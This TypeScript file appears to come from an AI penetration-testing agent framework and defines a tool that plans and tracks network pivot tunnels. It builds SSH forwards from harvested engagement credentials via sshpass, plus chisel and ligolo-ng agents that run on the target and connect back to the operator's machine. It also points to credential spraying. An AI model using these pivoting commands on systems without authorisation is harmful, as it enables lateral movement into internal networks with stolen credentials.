import { Effect, Schema } from "effect"
import { EngagementStore } from "@pentestcode/core/engagement/store"
import type { EngagementSchema } from "@pentestcode/core/engagement/schema"
import DESCRIPTION from "./tunnel-manage.txt"
import * as Tool from "./tool"

export const Parameters = Schema.Struct({
  action: Schema.Literals(["plan", "register", "list", "remove"]).annotate({
    description: "plan: generate tunnel commands. register: record established tunnel. list: show active tunnels. remove: mark session dead.",
  }),
  host_ip: Schema.optional(Schema.String).annotate({
    description: "Target host IP (required for plan/register)",
  }),
  tunnel_type: Schema.optional(
    Schema.Literals(["ssh_local", "ssh_dynamic", "socks", "port_forward", "chisel", "ligolo"]),
  ).annotate({
    description: "Tunnel type for plan/register",
  }),
  local_port: Schema.optional(Schema.Number).annotate({
    description: "Local port to bind",
  }),
  remote_target: Schema.optional(Schema.String).annotate({
    description: "Remote target host/IP for port forwarding",
  }),
  remote_port: Schema.optional(Schema.Number).annotate({
    description: "Remote target port for port forwarding",
  }),
  username: Schema.optional(Schema.String).annotate({
    description: "SSH/auth username (checked from engagement creds if omitted)",
  }),
  credential_id: Schema.optional(Schema.String).annotate({
    description: "Credential ID from engagement state",
  }),
  session_id: Schema.optional(Schema.String).annotate({
    description: "Session ID (for remove)",
  }),
})

const DEFAULT_LOCAL_PORT = 9050

function findCredsForHost(
  state: EngagementSchema.State,
  hostIp: string,
  credentialId?: string,
  username?: string,
): { user: string; value: string; credType: string; isKey: boolean } | undefined {
  if (credentialId) {
    const cred = state.credentials[credentialId]
    if (cred && cred.username && cred.value) {
      return {
        user: cred.username,
        value: cred.value,
        credType: cred.cred_type ?? "password",
        isKey: cred.cred_type === "ssh_key" || cred.cred_type === "private_key",
      }
    }
  }

  if (username) {
    for (const cred of Object.values(state.credentials)) {
      if (cred.username === username && cred.value) {
        return {
          user: cred.username,
          value: cred.value,
          credType: cred.cred_type ?? "password",
          isKey: cred.cred_type === "ssh_key" || cred.cred_type === "private_key",
        }
      }
    }
    return { user: username, value: "", credType: "password", isKey: false }
  }

  const host = state.hosts[hostIp]
  if (host) {
    for (const access of host.access) {
      const cred = Object.values(state.credentials).find(
        (c) => c.username === access.username && c.value,
      )
      if (cred) {
        return {
          user: cred.username!,
          value: cred.value!,
          credType: cred.cred_type ?? "password",
          isKey: cred.cred_type === "ssh_key" || cred.cred_type === "private_key",
        }
      }
    }
  }

  return undefined
}

function buildTunnelCommand(
  type: string,
  hostIp: string,
  creds: { user: string; value: string; isKey: boolean } | undefined,
  localPort: number,
  remoteTarget?: string,
  remotePort?: number,
): string[] {
  const lines: string[] = []
  const user = creds?.user ?? "USER"
  const authFlag = creds?.isKey ? `-i '${creds.value}'` : ""
  const sshpassPrefix = creds && !creds.isKey && creds.value ? `sshpass -p '${creds.value}' ` : ""

  switch (type) {
    case "ssh_local":
    case "port_forward": {
      const rt = remoteTarget ?? "127.0.0.1"
      const rp = remotePort ?? 80
      lines.push(`# SSH local port forward: localhost:${localPort} -> ${rt}:${rp} via ${hostIp}`)
      lines.push(`${sshpassPrefix}ssh ${authFlag} -L ${localPort}:${rt}:${rp} ${user}@${hostIp} -N -f`.replace(/\s+/g, " ").trim())
      lines.push(`# Verify: curl http://127.0.0.1:${localPort}/`)
      break
    }
    case "ssh_dynamic":
    case "socks": {
      lines.push(`# SSH dynamic SOCKS proxy on localhost:${localPort} via ${hostIp}`)
      lines.push(`${sshpassPrefix}ssh ${authFlag} -D ${localPort} ${user}@${hostIp} -N -f`.replace(/\s+/g, " ").trim())
      lines.push(`# Use: proxychains -q <command>  (ensure /etc/proxychains.conf has socks5 127.0.0.1 ${localPort})`)
      break
    }
    case "chisel": {
      const rt = remoteTarget ?? "127.0.0.1"
      const rp = remotePort ?? 80
      lines.push(`# Chisel tunnel: localhost:${localPort} -> ${rt}:${rp} via ${hostIp}`)
      lines.push(`# 1. Start chisel server on your machine:`)
      lines.push(`chisel server --reverse --port 8000`)
      lines.push(`# 2. On target (${hostIp}), run chisel client:`)
      lines.push(`chisel client YOUR_IP:8000 R:${localPort}:${rt}:${rp}`)
      lines.push(`# 3. Access via: curl http://127.0.0.1:${localPort}/`)
      break
    }
    case "ligolo": {
      lines.push(`# Ligolo-ng tunnel via ${hostIp}`)
      lines.push(`# 1. Start ligolo proxy on your machine:`)
      lines.push(`sudo ip tuntap add user $(whoami) mode tun ligolo`)
      lines.push(`sudo ip link set ligolo up`)
      lines.push(`ligolo-proxy -selfcert -laddr 0.0.0.0:11601`)
      lines.push(`# 2. On target (${hostIp}), run ligolo agent:`)
      lines.push(`./ligolo-agent -connect YOUR_IP:11601 -ignore-cert`)
      lines.push(`# 3. In ligolo proxy console:`)
      lines.push(`# session  (select the session)`)
      if (remoteTarget) {
        const subnet = remoteTarget.includes("/") ? remoteTarget : `${remoteTarget}/24`
        lines.push(`# sudo ip route add ${subnet} dev ligolo`)
      }
      lines.push(`# start`)
      break
    }
    default:
      lines.push(`# Unknown tunnel type: ${type}`)
  }

  return lines
}

function sessionTypeFromTunnelType(tunnelType: string): "tunnel" | "socks_proxy" | "port_forward" {
  switch (tunnelType) {
    case "ssh_dynamic":
    case "socks":
      return "socks_proxy"
    case "ssh_local":
    case "port_forward":
      return "port_forward"
    default:
      return "tunnel"
  }
}

export const TunnelManageTool = Tool.define(
  "tunnel_manage",
  Effect.gen(function* () {
    const store = yield* EngagementStore.Service

    return {
      description: DESCRIPTION,
      parameters: Parameters,
      execute: (
        params: Schema.Schema.Type<typeof Parameters>,
        _ctx: Tool.Context,
      ): Effect.Effect<Tool.ExecuteResult> =>
        Effect.gen(function* () {
          const state = yield* store.get()
          if (!state) {
            return { title: "Error", metadata: {}, output: "No engagement loaded." }
          }

          switch (params.action) {
            case "plan": {
              if (!params.host_ip) {
                return { title: "Error", metadata: {}, output: "Error: host_ip is required for plan action." }
              }
              const tunnelType = params.tunnel_type ?? "ssh_dynamic"
              const localPort = params.local_port ?? DEFAULT_LOCAL_PORT
              const creds = findCredsForHost(state, params.host_ip, params.credential_id, params.username)

              const lines: string[] = []
              lines.push(`Tunnel plan for ${params.host_ip} (${tunnelType}):`)
              lines.push("")

              if (!creds) {
                lines.push("WARNING: No credentials found for this host. Commands will use placeholder USER.")
                lines.push("Use cred_spray suggest to find valid credentials first.")
                lines.push("")
              } else {
                lines.push(`Credentials: ${creds.user} (${creds.credType})`)
                lines.push("")
              }

              const commands = buildTunnelCommand(
                tunnelType,
                params.host_ip,
                creds,
                localPort,
                params.remote_target,
                params.remote_port,
              )
              lines.push(...commands)

              lines.push("")
              lines.push("After establishing the tunnel, register it with: tunnel_manage action:register")

              return {
                title: `Tunnel plan: ${params.host_ip}`,
                metadata: { host_ip: params.host_ip, tunnel_type: tunnelType, local_port: localPort },
                output: lines.join("\n"),
              }
            }

            case "register": {
              if (!params.host_ip) {
                return { title: "Error", metadata: {}, output: "Error: host_ip is required for register action." }
              }
              const tunnelType = params.tunnel_type ?? "ssh_dynamic"
              const sessionType = sessionTypeFromTunnelType(tunnelType)
              const sessionId = params.session_id ?? `tunnel-${Date.now()}`
              const localPort = params.local_port ?? DEFAULT_LOCAL_PORT

              yield* store.addLiveSession({
                id: sessionId,
                session_type: sessionType,
                host_ip: params.host_ip,
                port: localPort,
                username: params.username,
                established_at: new Date().toISOString(),
                alive: true,
                local_port: localPort,
                remote_target: params.remote_target,
                details: `${tunnelType} tunnel`,
              })
              const updated = yield* store.get()
              if (updated) yield* store.save(updated)

              return {
                title: `Registered: ${sessionId}`,
                metadata: { session_id: sessionId, host_ip: params.host_ip },
                output: `Tunnel registered: ${sessionId} (${sessionType} via ${params.host_ip}, local port ${localPort})`,
              }
            }

            case "list": {
              const sessions = (state.live_sessions ?? []).filter((s) => s.alive !== false)
              if (sessions.length === 0) {
                return {
                  title: "No active tunnels",
                  metadata: { count: 0 },
                  output: "No active tunnels/sessions registered.",
                }
              }
              const lines: string[] = [`Active tunnels/sessions (${sessions.length}):`]
              for (const s of sessions) {
                const detail = s.remote_target ? ` -> ${s.remote_target}` : ""
                const lp = s.local_port ? ` local:${s.local_port}` : ""
                const user = s.username ? ` as ${s.username}` : ""
                lines.push(`  [${s.id}] ${s.session_type} ${s.host_ip}${s.port ? `:${s.port}` : ""}${detail}${lp}${user} (since ${s.established_at})`)
              }
              return {
                title: `${sessions.length} active tunnels`,
                metadata: { count: sessions.length },
                output: lines.join("\n"),
              }
            }

            case "remove": {
              if (!params.session_id) {
                return { title: "Error", metadata: {}, output: "Error: session_id is required for remove action." }
              }
              const removed = yield* store.removeLiveSession(params.session_id)
              if (!removed) {
                return { title: "Error", metadata: {}, output: `Session "${params.session_id}" not found.` }
              }
              const updated = yield* store.get()
              if (updated) yield* store.save(updated)
              return {
                title: `Removed: ${params.session_id}`,
                metadata: { session_id: params.session_id },
                output: `Session "${params.session_id}" removed.`,
              }
            }

            default:
              return { title: "Error", metadata: {}, output: `Unknown action: ${params.action}` }
          }
        }).pipe(Effect.orDie),
    }
  }),
)
